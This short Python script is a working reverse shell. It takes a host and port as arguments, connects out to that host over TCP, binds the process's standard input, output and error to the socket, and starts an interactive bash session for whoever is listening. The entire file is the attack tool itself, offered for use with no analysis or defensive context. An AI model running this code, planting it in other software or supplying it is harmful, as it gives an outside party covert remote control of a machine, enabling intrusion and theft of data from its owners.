import socket
import subprocess
import os
import argparse

# Set up argument parser
parser = argparse.ArgumentParser(description="Connect to a remote server and start a shell")
parser.add_argument('-ip', '--host', required=True, help="Server IP address")
parser.add_argument('-p', '--port', type=int, required=True, help="Server port number")

# Parse arguments
args = parser.parse_args()
HOST = args.host
PORT = args.port

# Create socket and connect
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

# Redirect stdin/stdout/stderr to socket
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# Start a shell
subprocess.call(["/bin/bash", "-i"])
